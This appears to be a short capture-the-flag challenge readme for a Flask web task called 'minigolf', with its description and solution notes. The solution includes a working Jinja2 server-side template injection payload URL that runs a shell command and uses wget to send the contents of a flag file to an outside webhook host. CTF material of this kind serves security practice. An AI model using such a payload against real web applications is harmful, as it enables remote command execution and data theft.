# minigolf
**Category:** Web
**Difficulty:** Easy-Medium
**Author:** Eth007

## Description

Too much Flask last year... let's bring it back again.

## Distribution

- website

## Deploy notes

not sure how well it will work over a remote connection

## Solution

- blind ssti, use time to bypass
- or this: http://minigolf.ictf.kctf.cloud/?txt={%set%20a=request.args%}{%set%20b=g.pop|attr(a.g)|attr(a.i)(a.b)|attr(a.i)(a.e)(a.c)%}&g=__globals__&b=__builtins__&i=__getitem__&e=eval&c=__import__(%22os%22).system(%22wget%20https://webhook.site/a84fff5a-2df4-4fc5-9ec1-4e2a69d2ccf8?flag=`cat%20/app/flag.txt`%22)
